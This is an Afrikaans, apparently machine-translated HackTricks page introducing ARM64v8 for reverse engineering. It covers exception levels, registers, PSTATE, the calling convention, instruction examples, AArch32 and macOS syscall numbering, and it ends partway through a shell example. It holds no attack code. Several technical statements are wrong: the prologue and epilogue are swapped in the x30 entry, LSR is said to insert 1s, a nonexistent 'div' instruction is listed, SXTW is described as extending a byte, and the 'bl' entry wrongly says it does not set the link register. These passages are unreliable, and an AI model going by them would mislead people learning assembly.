# Inleiding tot ARM64v8

{{#include ../../../banners/hacktricks-training.md}}

## **Uitsondering Niveaus - EL (ARM64v8)**

In ARMv8 argitektuur definieer uitvoeringsniveaus, bekend as Uitsondering Niveaus (ELs), die voorregtevlak en vermoëns van die uitvoeringsomgewing. Daar is vier uitsondering niveaus, wat wissel van EL0 tot EL3, elk met 'n ander doel:

1. **EL0 - Gebruikersmodus**:
- Dit is die minste voorregtevlak en word gebruik om gewone toepassingskode uit te voer.
- Toepassings wat op EL0 loop, is van mekaar en van die stelselsagteware geïsoleer, wat sekuriteit en stabiliteit verbeter.
2. **EL1 - Bedryfstelsel Kernel Modus**:
- Meeste bedryfstelsel-kernels loop op hierdie vlak.
- EL1 het meer voorregte as EL0 en kan toegang tot stelselhulpbronne hê, maar met sekere beperkings om stelselintegriteit te verseker.
3. **EL2 - Hypervisor Modus**:
- Hierdie vlak word gebruik vir virtualisering. 'n Hypervisor wat op EL2 loop, kan verskeie bedryfstelsels bestuur (elke in sy eie EL1) wat op dieselfde fisiese hardeware loop.
- EL2 bied kenmerke vir isolasie en beheer van die gevirtualiseerde omgewings.
4. **EL3 - Veilige Monitor Modus**:
- Dit is die mees voorregtevlak en word dikwels gebruik vir veilige opstart en vertroude uitvoeringsomgewings.
- EL3 kan toegang en kontrole tussen veilige en nie-veilige toestande bestuur (soos veilige opstart, vertroude OS, ens.).

Die gebruik van hierdie vlakke stel 'n gestruktureerde en veilige manier in om verskillende aspekte van die stelsel te bestuur, van gebruikersaansoeke tot die mees voorregte stelselsagteware. ARMv8 se benadering tot voorregtevlakke help om verskillende stelselskomponente effektief te isoleer, wat die sekuriteit en robuustheid van die stelsel verbeter.

## **Registers (ARM64v8)**

ARM64 het **31 algemene registers**, gemerk `x0` tot `x30`. Elke kan 'n **64-bit** (8-byte) waarde stoor. Vir operasies wat slegs 32-bit waardes vereis, kan dieselfde registers in 'n 32-bit modus met die name w0 tot w30 aangespreek word.

1. **`x0`** tot **`x7`** - Hierdie word tipies as skrapregisters en vir die oordrag van parameters na subroutines gebruik.
- **`x0`** dra ook die terugdata van 'n funksie
2. **`x8`** - In die Linux-kernel, word `x8` as die stelselaanroepnommer vir die `svc` instruksie gebruik. **In macOS is dit x16 wat gebruik word!**
3. **`x9`** tot **`x15`** - Meer tydelike registers, dikwels gebruik vir plaaslike veranderlikes.
4. **`x16`** en **`x17`** - **Intra-prosedurele Oproep Registers**. Tydelike registers vir onmiddellike waardes. Hulle word ook gebruik vir indirekte funksie-oproepe en PLT (Prosedure Koppeling Tabel) stubs.
- **`x16`** word as die **stelselaanroepnommer** vir die **`svc`** instruksie in **macOS** gebruik.
5. **`x18`** - **Platform register**. Dit kan as 'n algemene register gebruik word, maar op sommige platforms is hierdie register gereserveer vir platform-spesifieke gebruike: Punter na die huidige draad-omgewing blok in Windows, of om na die huidige **uitvoerende taakstruktuur in die linux kernel** te verwys.
6. **`x19`** tot **`x28`** - Hierdie is belde-bewaar registers. 'n Funksie moet hierdie registers se waardes vir sy oproeper behou, so hulle word in die stapel gestoor en herwin voordat hulle terug na die oproeper gaan.
7. **`x29`** - **Raamwyser** om die stapelraam te volg. Wanneer 'n nuwe stapelraam geskep word omdat 'n funksie opgeroep word, word die **`x29`** register **in die stapel gestoor** en die **nuwe** raamwyser adres is (**`sp`** adres) **in hierdie register gestoor**.
- Hierdie register kan ook as 'n **algemene register** gebruik word alhoewel dit gewoonlik as 'n verwysing na **lokale veranderlikes** gebruik word.
8. **`x30`** of **`lr`**- **Koppeling register**. Dit hou die **terugadres** wanneer 'n `BL` (Branch with Link) of `BLR` (Branch with Link to Register) instruksie uitgevoer word deur die **`pc`** waarde in hierdie register te stoor.
- Dit kan ook soos enige ander register gebruik word.
- As die huidige funksie 'n nuwe funksie gaan oproep en dus `lr` gaan oorskryf, sal dit dit aan die begin in die stapel stoor, dit is die epiloog (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Stoor `fp` en `lr`, genereer ruimte en kry nuwe `fp`) en dit aan die einde herwin, dit is die proloog (`ldp x29, x30, [sp], #48; ret` -> Herwin `fp` en `lr` en keer terug).
9. **`sp`** - **Stapelwyser**, gebruik om die bokant van die stapel te volg.
- die **`sp`** waarde moet altyd ten minste 'n **quadword** **uitlijning** of 'n uitlijningsfout mag voorkom.
10. **`pc`** - **Program teller**, wat na die volgende instruksie wys. Hierdie register kan slegs opgedateer word deur uitsondering generasies, uitsondering terugkeerde, en takke. Die enigste gewone instruksies wat hierdie register kan lees, is tak met koppeling instruksies (BL, BLR) om die **`pc`** adres in **`lr`** (Koppeling Register) te stoor.
11. **`xzr`** - **Nul register**. Ook genoem **`wzr`** in sy **32**-bit registervorm. Kan gebruik word om die nulwaarde maklik te kry (gewone operasie) of om vergelykings uit te voer met **`subs`** soos **`subs XZR, Xn, #10`** wat die resulterende data nêrens stoor (in **`xzr`**).

Die **`Wn`** registers is die **32bit** weergawe van die **`Xn`** register.

### SIMD en Vlotpunt Registers

Boonop is daar nog **32 registers van 128bit lengte** wat in geoptimaliseerde enkele instruksie meervoudige data (SIMD) operasies en vir die uitvoering van vlotpunt aritmetiek gebruik kan word. Hierdie word die Vn registers genoem alhoewel hulle ook in **64**-bit, **32**-bit, **16**-bit en **8**-bit kan werk en dan word hulle **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** en **`Bn`** genoem.

### Stelsels Registers

**Daar is honderde stelsels registers**, ook bekend as spesiale doeleindes registers (SPRs), wat gebruik word vir **monitering** en **beheer** van **verwerkers** gedrag.\
Hulle kan slegs gelees of gestel word met die toegewyde spesiale instruksie **`mrs`** en **`msr`**.

Die spesiale registers **`TPIDR_EL0`** en **`TPIDDR_EL0`** word algemeen gevind wanneer omgekeerde ingenieurswese gedoen word. Die `EL0` agtervoegsel dui die **minimale uitsondering** aan waaruit die register aangespreek kan word (in hierdie geval is EL0 die gewone uitsondering (voorreg) vlak waaroor gewone programme loop).\
Hulle word dikwels gebruik om die **basisadres van die draad-lokale berging** geheue streek te stoor. Gewoonlik is die eerste een leesbaar en skryfbaar vir programme wat in EL0 loop, maar die tweede kan van EL0 gelees en van EL1 (soos kernel) geskryf word.

- `mrs x0, TPIDR_EL0 ; Lees TPIDR_EL0 in x0`
- `msr TPIDR_EL0, X0 ; Skryf x0 in TPIDR_EL0`

### **PSTATE**

**PSTATE** bevat verskeie proses komponente wat in die bedryfstelsel-sigbare **`SPSR_ELx`** spesiale register geserieleer is, wat X die **toestemming** **vlak van die geaktiveerde** uitsondering aandui (dit stel in staat om die prosesstatus te herstel wanneer die uitsondering eindig).\
Hierdie is die toeganklike velde:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- Die **`N`**, **`Z`**, **`C`** en **`V`** toestand vlae:
- **`N`** beteken die operasie het 'n negatiewe resultaat opgelewer
- **`Z`** beteken die operasie het nul opgelewer
- **`C`** beteken die operasie het 'n dra oor
- **`V`** beteken die operasie het 'n onderteken oorgang opgelewer:
- Die som van twee positiewe getalle lewer 'n negatiewe resultaat.
- Die som van twee negatiewe getalle lewer 'n positiewe resultaat.
- In aftrekking, wanneer 'n groot negatiewe getal van 'n kleiner positiewe getal (of omgekeerd) afgetrek word, en die resultaat nie binne die reeks van die gegewe bitgrootte verteenwoordig kan word nie.
- Dit is duidelik dat die verwerker nie weet of die operasie onderteken is of nie, so dit sal C en V in die operasies nagaan en aandui of 'n dra plaasgevind het in die geval dit onderteken of nie-onderteken was.

> [!WARNING]
> Nie al die instruksies werk hierdie vlae op nie. Sommige soos **`CMP`** of **`TST`** doen, en ander wat 'n s agtervoegsel het soos **`ADDS`** doen dit ook.

- Die huidige **register breedte (`nRW`) vlag**: As die vlag die waarde 0 hou, sal die program in die AArch64 uitvoeringsstaat loop sodra dit hervat word.
- Die huidige **Uitsondering Vlak** (**`EL`**): 'n Gewone program wat in EL0 loop, sal die waarde 0 hê
- Die **enkele stap** vlag (**`SS`**): Gebruik deur debuggers om enkelstap deur die SS vlag op 1 in **`SPSR_ELx`** deur 'n uitsondering te stel. Die program sal 'n stap uitvoer en 'n enkele stap uitsondering uitreik.
- Die **onwettige uitsondering** toestand vlag (**`IL`**): Dit word gebruik om aan te dui wanneer 'n voorregte sagteware 'n ongeldige uitsondering vlak oordrag uitvoer, hierdie vlag word op 1 gestel en die verwerker aktiveer 'n onwettige toestand uitsondering.
- Die **`DAIF`** vlae: Hierdie vlae stel 'n voorregte program in staat om selektief sekere eksterne uitsonderings te masker.
- As **`A`** 1 is, beteken dit **asynchrone afbrake** sal geaktiveer word. Die **`I`** stel in om te reageer op eksterne hardeware **Interrupts Requests** (IRQs). en die F is verwant aan **Fast Interrupt Requests** (FIRs).
- Die **stapelwyser seleksie** vlae (**`SPS`**): Voorregte programme wat in EL1 en hoër loop, kan tussen die gebruik van hul eie stapelwyser register en die gebruikersmodel een (bv. tussen `SP_EL1` en `EL0`) wissel. Hierdie skakeling word uitgevoer deur na die **`SPSel`** spesiale register te skryf. Dit kan nie van EL0 gedoen word nie.

## **Oproep Konvensie (ARM64v8)**

Die ARM64 oproep konvensie spesifiseer dat die **eerste agt parameters** na 'n funksie in registers **`x0` tot `x7`** oorgedra word. **Addisionele** parameters word op die **stapel** oorgedra. Die **terug** waarde word in register **`x0`** teruggegee, of in **`x1`** as dit ook **128 bits lank** is. Die **`x19`** tot **`x30`** en **`sp`** registers moet **behou** word oor funksie-oproepe.

Wanneer 'n funksie in assembly gelees word, soek na die **funksie proloog en epiloog**. Die **proloog** behels gewoonlik **die stoor van die raamwyser (`x29`)**, **opstelling** van 'n **nuwe raamwyser**, en **toewysing van stapelruimte**. Die **epiloog** behels gewoonlik **die herstel van die gestoor raamwyser** en **terugkeer** van die funksie.

### Oproep Konvensie in Swift

Swift het sy eie **oproep konvensie** wat gevind kan word in [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Algemene Instruksies (ARM64v8)**

ARM64 instruksies het oor die algemeen die **formaat `opcode dst, src1, src2`**, waar **`opcode`** die **operasie** is wat uitgevoer moet word (soos `add`, `sub`, `mov`, ens.), **`dst`** is die **bestemmings** register waar die resultaat gestoor sal word, en **`src1`** en **`src2`** is die **bron** registers. Onmiddellike waardes kan ook in plaas van bron registers gebruik word.

- **`mov`**: **Beweeg** 'n waarde van een **register** na 'n ander.
- Voorbeeld: `mov x0, x1` — Dit beweeg die waarde van `x1` na `x0`.
- **`ldr`**: **Laai** 'n waarde van **geheue** in 'n **register**.
- Voorbeeld: `ldr x0, [x1]` — Dit laai 'n waarde van die geheue ligging wat deur `x1` aangedui word in `x0`.
- **Offset modus**: 'n offset wat die oorspronklike punter beïnvloed, word aangedui, byvoorbeeld:
- `ldr x2, [x1, #8]`, dit sal die waarde van x1 + 8 in x2 laai
- `ldr x2, [x0, x1, lsl #2]`, dit sal 'n objek van die array x0 laai, vanaf die posisie x1 (indeks) \* 4
- **Pre-geïndekseerde modus**: Dit sal berekeninge op die oorspronklike toepas, die resultaat kry en ook die nuwe oorspronklike in die oorspronklike stoor.
- `ldr x2, [x1, #8]!`, dit sal `x1 + 8` in `x2` laai en die resultaat van `x1 + 8` in x1 stoor
- `str lr, [sp, #-4]!`, Stoor die koppeling register in sp en werk die register sp op
- **Post-geïndekseerde modus**: Dit is soos die vorige een, maar die geheue adres word aangespreek en dan word die offset bereken en gestoor.
- `ldr x0, [x1], #8`, laai `x1` in `x0` en werk x1 op met `x1 + 8`
- **PC-relatiewe adressering**: In hierdie geval word die adres om te laai relatief tot die PC register bereken
- `ldr x1, =_start`, Dit sal die adres waar die `_start` simbool begin in x1 laai relatief tot die huidige PC.
- **`str`**: **Stoor** 'n waarde van 'n **register** in **geheue**.
- Voorbeeld: `str x0, [x1]` — Dit stoor die waarde in `x0` in die geheue ligging wat deur `x1` aangedui word.
- **`ldp`**: **Laai Paar Registers**. Hierdie instruksie **laai twee registers** van **aaneengeskakelde geheue** liggings. Die geheue adres word tipies gevorm deur 'n offset by die waarde in 'n ander register te voeg.
- Voorbeeld: `ldp x0, x1, [x2]` — Dit laai `x0` en `x1` van die geheue liggings by `x2` en `x2 + 8`, onderskeidelik.
- **`stp`**: **Stoor Paar Registers**. Hierdie instruksie **stoor twee registers** na **aaneengeskakelde geheue** liggings. Die geheue adres word tipies gevorm deur 'n offset by die waarde in 'n ander register te voeg.
- Voorbeeld: `stp x0, x1, [sp]` — Dit stoor `x0` en `x1` na die geheue liggings by `sp` en `sp + 8`, onderskeidelik.
- `stp x0, x1, [sp, #16]!` — Dit stoor `x0` en `x1` na die geheue liggings by `sp+16` en `sp + 24`, onderskeidelik, en werk `sp` op met `sp+16`.
- **`add`**: **Voeg** die waardes van twee registers by en stoor die resultaat in 'n register.
- Sintaksis: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Bestemming
- Xn2 -> Operand 1
- Xn3 | #imm -> Operando 2 (register of onmiddellik)
- \[shift #N | RRX] -> Voer 'n skuif uit of bel RRX
- Voorbeeld: `add x0, x1, x2` — Dit voeg die waardes in `x1` en `x2` saam en stoor die resultaat in `x0`.
- `add x5, x5, #1, lsl #12` — Dit is gelyk aan 4096 (1 wat 12 keer geskuif word) -> 1 0000 0000 0000 0000
- **`adds`** Dit voer 'n `add` uit en werk die vlae op
- **`sub`**: **Trek** die waardes van twee registers af en stoor die resultaat in 'n register.
- Kontroleer **`add`** **sintaksis**.
- Voorbeeld: `sub x0, x1, x2` — Dit trek die waarde in `x2` van `x1` af en stoor die resultaat in `x0`.
- **`subs`** Dit is soos sub maar werk die vlag op
- **`mul`**: **Vermenigvuldig** die waardes van **twee registers** en stoor die resultaat in 'n register.
- Voorbeeld: `mul x0, x1, x2` — Dit vermenigvuldig die waardes in `x1` en `x2` en stoor die resultaat in `x0`.
- **`div`**: **Deel** die waarde van een register deur 'n ander en stoor die resultaat in 'n register.
- Voorbeeld: `div x0, x1, x2` — Dit deel die waarde in `x1` deur `x2` en stoor die resultaat in `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Logiese skuif links**: Voeg 0s van die einde by en skuif die ander bits vorentoe (vermenigvuldig met n-keer 2)
- **Logiese skuif regs**: Voeg 1s aan die begin by en skuif die ander bits agtertoe (deel deur n-keer 2 in nie-onderteken)
- **Aritmetiese skuif regs**: Soos **`lsr`**, maar in plaas van 0s by te voeg, as die mees betekenisvolle bit 'n 1 is, **word 1s bygevoeg** (deel deur n-keer 2 in onderteken)
- **Draai regs**: Soos **`lsr`** maar wat ook al van die regterkant verwyder word, word aan die linkerkant bygevoeg
- **Draai Regs met Uitbreiding**: Soos **`ror`**, maar met die dra vlag as die "mees betekenisvolle bit". So die dra vlag word na die bit 31 verskuif en die verwyderde bit na die dra vlag.
- **`bfm`**: **Bit Veld Beweeg**, hierdie operasies **kopieer bits `0...n`** van 'n waarde en plaas hulle in posisies **`m..m+n`**. Die **`#s`** spesifiseer die **linkerste bit** posisie en **`#r`** die **dra regs hoeveelheid**.
- Bitveld beweeg: `BFM Xd, Xn, #r`
- Onderteken Bitveld beweeg: `SBFM Xd, Xn, #r, #s`
- Nie-onderteken Bitveld beweeg: `UBFM Xd, Xn, #r, #s`
- **Bitveld Uittrek en Invoeg:** Kopieer 'n bitveld van 'n register en kopieer dit na 'n ander register.
- **`BFI X1, X2, #3, #4`** Voeg 4 bits van X2 vanaf die 3de bit van X1 in
- **`BFXIL X1, X2, #3, #4`** Trek 4 bits vanaf die 3de bit van X2 uit en kopieer dit na X1
- **`SBFIZ X1, X2, #3, #4`** Onderteken-uitbrei 4 bits van X2 en voeg dit in X1 in wat by bit posisie 3 begin en die regter bits nulmaak
- **`SBFX X1, X2, #3, #4`** Trek 4 bits vanaf bit 3 van X2 uit, onderteken uitbrei hulle, en plaas die resultaat in X1
- **`UBFIZ X1, X2, #3, #4`** Nul-uitbrei 4 bits van X2 en voeg dit in X1 in wat by bit posisie 3 begin en die regter bits nulmaak
- **`UBFX X1, X2, #3, #4`** Trek 4 bits vanaf bit 3 van X2 uit en plaas die nul-uitgebreide resultaat in X1.
- **Onderteken Uitbrei na X:** Brei die teken uit (of voeg net 0s in die nie-onderteken weergawe) van 'n waarde om operasies daarmee uit te voer:
- **`SXTB X1, W2`** Brei die teken van 'n byte **van W2 na X1** uit (`W2` is die helfte van `X2`) om die 64bits te vul
- **`SXTH X1, W2`** Brei die teken van 'n 16bit getal **van W2 na X1** uit om die 64bits te vul
- **`SXTW X1, W2`** Brei die teken van 'n byte **van W2 na X1** uit om die 64bits te vul
- **`UXTB X1, W2`** Voeg 0s (nie-onderteken) by 'n byte **van W2 na X1** om die 64bits te vul
- **`extr`:** Trek bits uit 'n spesifieke **paar registers wat gekombineer is**.
- Voorbeeld: `EXTR W3, W2, W1, #3` Dit sal **W1+W2 kombineer** en **van bit 3 van W2 tot bit 3 van W1** kry en dit in W3 stoor.
- **`cmp`**: **Vergelyk** twee registers en stel toestand vlae. Dit is 'n **alias van `subs`** wat die bestemming register na die nul register stel. Nuttig om te weet of `m == n`.
- Dit ondersteun die **dieselfde sintaksis as `subs`**
- Voorbeeld: `cmp x0, x1` — Dit vergelyk die waardes in `x0` en `x1` en stel die toestand vlae ooreenkomstig op.
- **`cmn`**: **Vergelyk negatiewe** operand. In hierdie geval is dit 'n **alias van `adds`** en ondersteun die dieselfde sintaksis. Nuttig om te weet of `m == -n`.
- **`ccmp`**: Voorwaardelike vergelyking, dit is 'n vergelyking wat slegs uitgevoer sal word as 'n vorige vergelyking waar was en sal spesifiek nzcv bits stel.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> as x1 != x2 en x3 < x4, spring na func
- Dit is omdat **`ccmp`** slegs uitgevoer sal word as die **vorige `cmp` 'n `NE` was**, as dit nie was nie, sal die bits `nzcv` op 0 gestel word (wat nie die `blt` vergelyking sal bevredig nie).
- Dit kan ook as `ccmn` gebruik word (dieselfde maar negatief, soos `cmp` teenoor `cmn`).
- **`tst`**: Dit kyk of enige van die waardes van die vergelyking albei 1 is (dit werk soos 'n ANDS sonder om die resultaat enige plek te stoor). Dit is nuttig om 'n register met 'n waarde te kontroleer en te kyk of enige van die bits van die register wat in die waarde aangedui word 1 is.
- Voorbeeld: `tst X1, #7` Kyk of enige van die laaste 3 bits van X1 1 is
- **`teq`**: XOR operasie wat die resultaat verwerp
- **`b`**: Onvoorwaardelike Tak
- Voorbeeld: `b myFunction`
- Let daarop dat dit nie die koppeling register met die terugadres sal vul nie (nie geskik vir subrutine oproepe wat terug moet keer nie)
- **`bl`**: **Tak** met koppeling, gebruik om 'n **subroutine** te **roep**. Stoor die **terugadres in `x30`**.
- Voorbeeld: `bl myFunction` — Dit roep die funksie `myFunction` en stoor die terugadres in `x30`.
- Let daarop dat dit nie die koppeling register met die terugadres sal vul nie (nie geskik vir subrutine oproepe wat terug moet keer nie)
- **`blr`**: **Tak** met Koppeling na Register, gebruik om 'n **subroutine** te **roep** waar die teiken in 'n **register** gespesifiseer word. Stoor die terugadres in `x30`. (Dit is
- Voorbeeld: `blr x1` — Dit roep die funksie waarvan die adres in `x1` bevat is en stoor die terugadres in `x30`.
- **`ret`**: **Terugkeer** van **subroutine**, tipies met die adres in **`x30`**.
- Voorbeeld: `ret` — Dit keer terug van die huidige subroutine met die terugadres in `x30`.
- **`b.<cond>`**: Voorwaardelike takke
- **`b.eq`**: **Tak as gelyk**, gebaseer op die vorige `cmp` instruksie.
- Voorbeeld: `b.eq label` — As die vorige `cmp` instruksie twee gelyke waardes gevind het, spring dit na `label`.
- **`b.ne`**: **Tak as Nie Gelyk**. Hierdie instruksie kyk die toestand vlae na (wat deur 'n vorige vergelyking instruksie gestel is), en as die vergelykte waardes nie gelyk was nie, tak dit na 'n etiket of adres.
- Voorbeeld: Na 'n `cmp x0, x1` instruksie, `b.ne label` — As die waardes in `x0` en `x1 nie gelyk was nie, spring dit na `label`.
- **`cbz`**: **Vergelyk en Tak op Nul**. Hierdie instruksie vergelyk 'n register met nul, en as hulle gelyk is, tak dit na 'n etiket of adres.
- Voorbeeld: `cbz x0, label` — As die waarde in `x0` nul is, spring dit na `label`.
- **`cbnz`**: **Vergelyk en Tak op Nie-Nul**. Hierdie instruksie vergelyk 'n register met nul, en as hulle nie gelyk is nie, tak dit na 'n etiket of adres.
- Voorbeeld: `cbnz x0, label` — As die waarde in `x0` nie nul is nie, spring dit na `label`.
- **`tbnz`**: Toets bit en tak op nie-nul
- Voorbeeld: `tbnz x0, #8, label`
- **`tbz`**: Toets bit en tak op nul
- Voorbeeld: `tbz x0, #8, label`
- **Voorwaardelike seleksie operasies**: Dit is operasies waarvan die gedrag wissel, afhangende van die voorwaardelike bits.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> As waar, X0 = X1, as vals, X0 = X2
- `csinc Xd, Xn, Xm, cond` -> As waar, Xd = Xn, as vals, Xd = Xn + 1
- `cinc Xd, Xn, cond` -> As waar, Xd = Xn + 1, as vals, Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> As waar, Xd = Xn, as vals, Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> As waar, Xd = NOT(Xn), as vals, Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> As waar, Xd = Xn, as vals, Xd = - Xm
- `cneg Xd, Xn, cond` -> As waar, Xd = - Xn, as vals, Xd = Xn
- `cset Xd, Xn, Xm, cond` -> As waar, Xd = 1, as vals, Xd = 0
- `csetm Xd, Xn, Xm, cond` -> As waar, Xd = \<alle 1>, as vals, Xd = 0
- **`adrp`**: Bereken die **bladsy adres van 'n simbool** en stoor dit in 'n register.
- Voorbeeld: `adrp x0, symbol` — Dit bereken die bladsy adres van `symbol` en stoor dit in `x0`.
- **`ldrsw`**: **Laai** 'n ondertekende **32-bit** waarde van geheue en **onderteken-uitbrei dit na 64** bits.
- Voorbeeld: `ldrsw x0, [x1]` — Dit laai 'n ondertekende 32-bit waarde van die geheue ligging wat deur `x1` aangedui word, onderteken-uitbrei dit na 64 bits, en stoor dit in `x0`.
- **`stur`**: **Stoor 'n register waarde na 'n geheue ligging**, met 'n offset van 'n ander register.
- Voorbeeld: `stur x0, [x1, #4]` — Dit stoor die waarde in `x0` in die geheue adres wat 4 bytes groter is as die adres wat tans in `x1` is.
- **`svc`** : Maak 'n **stelselaanroep**. Dit staan vir "Supervisor Call". Wanneer die verwerker hierdie instruksie uitvoer, **skakel dit van gebruikersmodus na kernelmodus** en spring na 'n spesifieke ligging in geheue waar die **kernel se stelselaanroep hantering** kode geleë is.

- Voorbeeld:

```armasm
mov x8, 93  ; Laai die stelselaanroepnommer vir uitgang (93) in register x8.
mov x0, 0   ; Laai die uitgangstatuskode (0) in register x0.
svc 0       ; Maak die stelselaanroep.
```

### **Funksie Proloog**

1. **Stoor die koppeling register en raamwyser na die stapel**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Stel die nuwe raamwyser op**: `mov x29, sp` (stel die nuwe raamwyser op vir die huidige funksie)  
3. **Toewys ruimte op die stapel vir plaaslike veranderlikes** (indien nodig): `sub sp, sp, <size>` (waar `<size>` die aantal bytes is wat benodig word)  

### **Funksie Epiloog**

1. **Deallocate plaaslike veranderlikes (indien enige toegeken is)**: `add sp, sp, <size>`  
2. **Herstel die skakelregister en raamwyser**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret` (gee beheer terug aan die oproeper met behulp van die adres in die skakelregister)

## AARCH32 Uitvoeringsstaat

Armv8-A ondersteun die uitvoering van 32-bis programme. **AArch32** kan in een van **twee instruksiesette** loop: **`A32`** en **`T32`** en kan tussen hulle skakel via **`interworking`**.\
**Bevoorregte** 64-bis programme kan die **uitvoering van 32-bis** programme skeduleer deur 'n uitsonderingsvlak oordrag na die laer bevoorregte 32-bis uit te voer.\
Let daarop dat die oorgang van 64-bis na 32-bis plaasvind met 'n verlaging van die uitsonderingsvlak (byvoorbeeld 'n 64-bis program in EL1 wat 'n program in EL0 aktiveer). Dit word gedoen deur die **bit 4 van** **`SPSR_ELx`** spesiale register **op 1** te stel wanneer die `AArch32` prosesdraad gereed is om uitgevoer te word en die res van `SPSR_ELx` die **`AArch32`** programme CPSR stoor. Dan roep die bevoorregte proses die **`ERET`** instruksie aan sodat die verwerker oorgaan na **`AArch32`** en in A32 of T32 ingaan, afhangende van CPSR\*\*.\*\*

Die **`interworking`** vind plaas met behulp van die J en T bits van CPSR. `J=0` en `T=0` beteken **`A32`** en `J=0` en `T=1` beteken **T32**. Dit beteken basies om die **laagste bit op 1** te stel om aan te dui dat die instruksieset T32 is.\
Dit word tydens die **interworking takinstruksies** gestel, maar kan ook direk met ander instruksies gestel word wanneer die PC as die bestemmingsregister gestel word. Voorbeeld:

Nog 'n voorbeeld:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registers

Daar is 16 32-bit registers (r0-r15). **Van r0 tot r14** kan hulle gebruik word vir **enige operasie**, maar sommige van hulle is gewoonlik gereserveer:

- **`r15`**: Program counter (altyd). Bevat die adres van die volgende instruksie. In A32 huidige + 8, in T32, huidige + 4.
- **`r11`**: Frame Pointer
- **`r12`**: Intra-procedural call register
- **`r13`**: Stack Pointer
- **`r14`**: Link Register

Boonop word registers geback-up in **`banked registries`**. Dit is plekke wat die registerwaardes stoor wat vinnige kontekswisseling in uitsondering hantering en bevoorregte operasies moontlik maak om die behoefte om registers handmatig te stoor en te herstel elke keer te vermy.\
Dit word gedoen deur **die verwerkerstatus van die `CPSR` na die `SPSR`** van die verwerker modus waarheen die uitsondering geneem word, te stoor. By die uitsondering terugkeer, word die **`CPSR`** van die **`SPSR`** herstel.

### CPSR - Current Program Status Register

In AArch32 werk die CPSR soortgelyk aan **`PSTATE`** in AArch64 en word ook gestoor in **`SPSR_ELx`** wanneer 'n uitsondering geneem word om later die uitvoering te herstel:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

Die velde is in 'n paar groepe verdeel:

- Application Program Status Register (APSR): Aritmetiese vlae en toeganklik vanaf EL0
- Execution State Registers: Proses gedrag (geadministreer deur die OS).

#### Application Program Status Register (APSR)

- Die **`N`**, **`Z`**, **`C`**, **`V`** vlae (net soos in AArch64)
- Die **`Q`** vlae: Dit word op 1 gestel wanneer **heelgetal saturasie plaasvind** tydens die uitvoering van 'n gespesialiseerde versadigende aritmetiese instruksie. Sodra dit op **`1`** gestel is, sal dit die waarde behou totdat dit handmatig op 0 gestel word. Boonop is daar geen instruksie wat sy waarde implisiet nagaan nie, dit moet gedoen word deur dit handmatig te lees.
- **`GE`** (Groter as of gelyk aan) Vlae: Dit word gebruik in SIMD (Single Instruction, Multiple Data) operasies, soos "parallel add" en "parallel subtract". Hierdie operasies stel in staat om verskeie datapunte in 'n enkele instruksie te verwerk.

Byvoorbeeld, die **`UADD8`** instruksie **voeg vier pare van bytes** (van twee 32-bit operande) parallel by en stoor die resultate in 'n 32-bit register. Dit stel dan **die `GE` vlae in die `APSR`** op grond van hierdie resultate. Elke GE-vlag kom ooreen met een van die byte byvoegings, wat aandui of die byvoeging vir daardie byte paar **oorloop** het.

Die **`SEL`** instruksie gebruik hierdie GE vlae om voorwaardelike aksies uit te voer.

#### Execution State Registers

- Die **`J`** en **`T`** bits: **`J`** moet 0 wees en as **`T`** 0 is, word die instruksieset A32 gebruik, en as dit 1 is, word die T32 gebruik.
- **IT Block State Register** (`ITSTATE`): Dit is die bits van 10-15 en 25-26. Hulle stoor toestande vir instruksies binne 'n **`IT`** voorvoegsel groep.
- **`E`** bit: Dui die **endianness** aan.
- **Mode en Exception Mask Bits** (0-4): Hulle bepaal die huidige uitvoeringsstatus. Die **5de** dui aan of die program as 32bit (n 1) of 64bit (n 0) loop. Die ander 4 verteenwoordig die **uitsonderingsmodus wat tans gebruik word** (wanneer 'n uitsondering plaasvind en dit hanteer word). Die nommer wat gestel word **dui die huidige prioriteit aan** in die geval dat 'n ander uitsondering geaktiveer word terwyl dit hanteer word.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Sekere uitsonderings kan gedeaktiveer word met die bits **`A`**, `I`, `F`. As **`A`** 1 is, beteken dit dat **asynchrone aborts** geaktiveer sal word. Die **`I`** stel in om te reageer op eksterne hardeware **Interrupts Requests** (IRQs). en die F is verwant aan **Fast Interrupt Requests** (FIRs).

## macOS

### BSD syscalls

Kyk na [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master). BSD syscalls sal **x16 > 0** hê.

### Mach Traps

Kyk na [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) die `mach_trap_table` en in [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) die prototipes. Die maksimum aantal Mach traps is `MACH_TRAP_TABLE_COUNT` = 128. Mach traps sal **x16 < 0** hê, so jy moet die nommers van die vorige lys met 'n **minus** aanroep: **`_kernelrpc_mach_vm_allocate_trap`** is **`-10`**.

Jy kan ook **`libsystem_kernel.dylib`** in 'n disassembler nagaan om te vind hoe om hierdie (en BSD) syscalls aan te roep:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
